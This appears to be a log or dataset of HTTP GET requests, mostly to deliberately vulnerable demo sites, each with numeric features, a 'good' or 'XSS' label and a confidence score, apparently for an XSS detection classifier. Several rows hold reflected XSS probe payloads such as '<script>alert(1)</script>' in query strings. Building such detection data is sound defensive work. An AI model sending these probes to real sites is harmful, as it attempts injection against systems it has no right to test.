GET,http://demo.testfire.net/,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/style.css,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/logo.gif,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/home3.jpg,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/home2.jpg,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/home1.jpg,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/pf_lock.gif,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/header_pic.jpg,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/gradient.jpg,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/search.jsp?query=nalx,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/style.css,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/logo.gif,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/header_pic.jpg,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/pf_lock.gif,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/gradient.jpg,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/search.jsp?query=<script>alert(1)</script>,,0,0,0,1,0,4,0,0,0,0,1,0,0,XSS,1.0
GET,http://demo.testfire.net/,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/search.jsp?query=<,,0,0,0,0,0,1,0,0,0,0,0,0,0,XSS,0.9999
GET,http://demo.testfire.net/search.jsp?query=,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/style.css,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/logo.gif,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/header_pic.jpg,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/pf_lock.gif,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/gradient.jpg,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/search.jsp?query=<script>alert(1)</script>,,0,0,0,1,0,4,0,0,0,0,1,0,0,XSS,1.0
GET,http://demo.testfire.net/search.jsp?query=<script>alert(1)</script>,,0,0,0,1,0,4,0,0,0,0,1,0,0,XSS,1.0
GET,http://demo.testfire.net/search.jsp?query=<script>alert(1)</script>,,0,0,0,1,0,4,0,0,0,0,1,0,0,XSS,1.0
GET,http://demo.testfire.net/search.jsp?query=lanx,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/style.css,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/logo.gif,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/pf_lock.gif,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/header_pic.jpg,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/gradient.jpg,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/search.jsp?query=>,,0,0,0,0,0,1,0,0,0,0,0,0,0,XSS,0.9999
GET,http://demo.testfire.net/,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/style.css,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/logo.gif,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/home3.jpg,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/home2.jpg,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/home1.jpg,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/pf_lock.gif,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/header_pic.jpg,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/gradient.jpg,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/search.jsp?query=alert,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/style.css,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/logo.gif,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/header_pic.jpg,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/pf_lock.gif,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/gradient.jpg,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,"http://demo.testfire.net/search.jsp?query=alert""",,0,1,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/style.css,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/logo.gif,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/header_pic.jpg,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/pf_lock.gif,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/gradient.jpg,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,"http://demo.testfire.net/search.jsp?query=alert"">",,0,1,0,0,0,1,0,0,0,0,0,0,0,XSS,0.9998
GET,"http://demo.testfire.net/search.jsp?query=alert""<",,0,1,0,0,0,1,0,0,0,0,0,0,0,XSS,0.9998
GET,"http://demo.testfire.net/search.jsp?query=alert""<",,0,1,0,0,0,1,0,0,0,0,0,0,0,XSS,0.9998
GET,"http://demo.testfire.net/search.jsp?query=alert""%u023",,0,1,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/style.css,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/logo.gif,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/header_pic.jpg,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/pf_lock.gif,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/gradient.jpg,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,"http://demo.testfire.net/search.jsp?query=alert""%u022",,0,1,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/style.css,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/logo.gif,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/header_pic.jpg,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/pf_lock.gif,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/gradient.jpg,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/search.jsp?query=alert!%u022,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/style.css,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/logo.gif,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/header_pic.jpg,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/pf_lock.gif,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/gradient.jpg,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://detectportal.firefox.com/canonical.html,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://detectportal.firefox.com/success.txt?ipv4,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://detectportal.firefox.com/success.txt?ipv6,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/style.css,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/home3.jpg,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/home2.jpg,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/home1.jpg,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/logo.gif,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/header_pic.jpg,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/pf_lock.gif,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/gradient.jpg,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/search.jsp?query=<scriptalert(1)</script>,,0,0,0,1,0,3,0,0,0,0,1,0,0,XSS,1.0
GET,http://demo.testfire.net/,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://detectportal.firefox.com/canonical.html,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://detectportal.firefox.com/success.txt?ipv4,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://detectportal.firefox.com/success.txt?ipv6,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/search.jsp?query=<scriptalert(1)</script>,,0,0,0,1,0,3,0,0,0,0,1,0,0,XSS,1.0
GET,http://demo.testfire.net/,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/search.jsp?query=script,,0,0,0,0,0,0,0,0,0,0,1,0,0,good,1.0
GET,http://demo.testfire.net/style.css,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/logo.gif,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/header_pic.jpg,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/pf_lock.gif,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/gradient.jpg,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/search.jsp?query=alert,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/style.css,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/pf_lock.gif,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/logo.gif,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/header_pic.jpg,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/gradient.jpg,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,"http://demo.testfire.net/search.jsp?query=alert""<script",,0,1,0,0,0,1,0,0,0,0,1,0,0,XSS,0.9998
GET,http://detectportal.firefox.com/canonical.html,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://detectportal.firefox.com/success.txt?ipv4,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://detectportal.firefox.com/success.txt?ipv6,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/style.css,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/logo.gif,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/header_pic.jpg,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/home3.jpg,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/home2.jpg,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/home1.jpg,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/pf_lock.gif,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/gradient.jpg,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/search.jsp?query=<script>alert(1)</script>,,0,0,0,1,0,4,0,0,0,0,1,0,0,XSS,1.0
GET,http://demo.testfire.net/search.jsp?query=<script>,,0,0,0,0,0,2,0,0,0,0,1,0,0,XSS,0.9999
GET,http://demo.testfire.net/search.jsp?query=<script>,,0,0,0,0,0,2,0,0,0,0,1,0,0,XSS,0.9999
GET,http://demo.testfire.net/,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/pf_lock.gif,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/home1.jpg,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/home2.jpg,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/style.css,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/header_pic.jpg,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/home3.jpg,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/logo.gif,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/gradient.jpg,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/style.css,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/home3.jpg,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/home2.jpg,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/logo.gif,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/header_pic.jpg,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/pf_lock.gif,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/home1.jpg,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/gradient.jpg,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/style.css,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/logo.gif,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/header_pic.jpg,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/home3.jpg,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/home2.jpg,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/home1.jpg,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/pf_lock.gif,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/gradient.jpg,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/search.jsp?query=<script>,,0,0,0,0,0,2,0,0,0,0,1,0,0,XSS,0.9999
GET,http://crapi.apisec.ai/,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://crapi.apisec.ai/static/css/2.a2026422.chunk.css,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://crapi.apisec.ai/static/css/main.fca8df6d.chunk.css,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://crapi.apisec.ai/static/js/2.e7093047.chunk.js,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://crapi.apisec.ai/static/js/main.fd3f1560.chunk.js,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://crapi.apisec.ai/logo192.png,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://crapi.apisec.ai/favicon.ico,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://crapi.apisec.ai/login?url=<script>alert(1)</script>,,0,0,0,1,0,4,0,0,0,0,1,0,0,XSS,1.0
GET,http://139.59.86.156/,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://139.59.86.156/cgi-sys/defaultwebpage.cgi,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://139.59.86.156/img-sys/IP_changed.png,,0,0,0,0,0,0,0,0,0,0,1,0,0,good,1.0
GET,http://139.59.86.156/img-sys/server_misconfigured.png,,0,0,0,0,0,0,0,0,0,0,1,0,0,good,1.0
GET,http://139.59.86.156/img-sys/server_moved.png,,0,0,0,0,0,0,0,0,0,0,1,0,0,good,1.0
GET,http://139.59.86.156/img-sys/powered_by_cpanel.svg,,0,0,0,0,0,0,0,0,0,0,2,0,0,good,1.0
GET,http://139.59.86.156/img-sys/error-bg-left.png,,0,0,0,0,0,0,0,0,0,0,1,0,0,good,1.0
GET,http://139.59.86.156/,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://139.59.86.156/cgi-sys/defaultwebpage.cgi,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://139.59.86.156/img-sys/IP_changed.png,,0,0,0,0,0,0,0,0,0,0,1,0,0,good,1.0
GET,http://139.59.86.156/img-sys/server_misconfigured.png,,0,0,0,0,0,0,0,0,0,0,1,0,0,good,1.0
GET,http://139.59.86.156/img-sys/powered_by_cpanel.svg,,0,0,0,0,0,0,0,0,0,0,2,0,0,good,1.0
GET,http://139.59.86.156/img-sys/server_moved.png,,0,0,0,0,0,0,0,0,0,0,1,0,0,good,1.0
GET,http://139.59.86.156/img-sys/error-bg-left.png,,0,0,0,0,0,0,0,0,0,0,1,0,0,good,1.0
GET,http://detectportal.firefox.com/canonical.html,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://detectportal.firefox.com/success.txt?ipv4,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://detectportal.firefox.com/success.txt?ipv6,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/style.css,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/logo.gif,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/home3.jpg,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/home2.jpg,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/home1.jpg,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/pf_lock.gif,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/header_pic.jpg,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/gradient.jpg,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/search.jsp?query=john,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/style.css,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/logo.gif,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/header_pic.jpg,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/pf_lock.gif,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/gradient.jpg,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://detectportal.firefox.com/canonical.html,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://detectportal.firefox.com/success.txt?ipv4,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://detectportal.firefox.com/success.txt?ipv6,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/search.jsp?query=<script>alert(1)</script>,,0,0,0,1,0,4,0,0,0,0,1,0,0,XSS,1.0
GET,http://demo.testfire.net/search.jsp?query=script,,0,0,0,0,0,0,0,0,0,0,1,0,0,good,1.0
GET,http://demo.testfire.net/style.css,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/logo.gif,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/header_pic.jpg,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/pf_lock.gif,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/gradient.jpg,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/search.jsp?query=script.alert(1),,0,0,0,1,0,0,0,0,0,0,1,0,0,XSS,0.9999
GET,http://demo.testfire.net/search.jsp?query=script+alert,,0,0,0,0,0,0,0,0,0,0,1,0,0,good,1.0
GET,http://demo.testfire.net/style.css,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/logo.gif,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/header_pic.jpg,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/pf_lock.gif,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/gradient.jpg,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/search.jsp?query=><,,0,0,0,0,0,2,0,0,0,0,0,0,0,XSS,0.9999
GET,http://demo.testfire.net/search.jsp?query=<,,0,0,0,0,0,1,0,0,0,0,0,0,0,XSS,0.9999
GET,"http://crapi.apisec.ai/login?console.prompt(""hell0o"")",,0,2,0,1,0,0,0,0,0,0,0,0,0,XSS,1.0
GET,http://crapi.apisec.ai/login,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://crapi.apisec.ai/static/css/2.a2026422.chunk.css,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://crapi.apisec.ai/static/css/main.fca8df6d.chunk.css,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://crapi.apisec.ai/static/js/2.e7093047.chunk.js,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://crapi.apisec.ai/static/js/main.fd3f1560.chunk.js,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://crapi.apisec.ai/logo192.png,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://crapi.apisec.ai/login?<script>,,0,0,0,0,0,2,0,0,0,0,1,0,0,XSS,0.9999
GET,http://detectportal.firefox.com/canonical.html,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://detectportal.firefox.com/success.txt?ipv4,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://detectportal.firefox.com/success.txt?ipv6,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://detectportal.firefox.com/canonical.html,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://detectportal.firefox.com/success.txt?ipv4,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://detectportal.firefox.com/success.txt?ipv6,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/search.jsp?query=<script>alert(1)</script>,,0,0,0,1,0,4,0,0,0,0,1,0,0,XSS,1.0
GET,http://demo.testfire.net/search.jsp?query=<,,0,0,0,0,0,1,0,0,0,0,0,0,0,XSS,0.9999
GET,http://demo.testfire.net/search.jsp?query=hacker.alert>,,0,0,0,0,0,1,0,0,0,0,0,0,0,XSS,0.9999
GET,http://detectportal.firefox.com/canonical.html,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://detectportal.firefox.com/success.txt?ipv4,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://detectportal.firefox.com/success.txt?ipv6,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/style.css,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/logo.gif,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/home3.jpg,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/home2.jpg,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/home1.jpg,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/pf_lock.gif,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/gradient.jpg,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/search.jsp?query=<script>alert(1)</script>,,0,0,0,1,0,4,0,0,0,0,1,0,0,XSS,1.0
GET,http://detectportal.firefox.com/canonical.html,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://detectportal.firefox.com/success.txt?ipv4,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://detectportal.firefox.com/success.txt?ipv6,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://detectportal.firefox.com/canonical.html,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://detectportal.firefox.com/success.txt?ipv4,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://detectportal.firefox.com/success.txt?ipv6,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/style.css,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/logo.gif,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/header_pic.jpg,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/home3.jpg,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/home2.jpg,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/home1.jpg,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/pf_lock.gif,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/gradient.jpg,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://detectportal.firefox.com/canonical.html,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://detectportal.firefox.com/success.txt?ipv4,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://detectportal.firefox.com/success.txt?ipv6,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/search.jsp?query=<script>alert(1)</script>,,0,0,0,1,0,4,0,0,0,0,1,0,0,XSS,1.0
GET,http://demo.testfire.net/search.jsp?query=alert,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/style.css,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
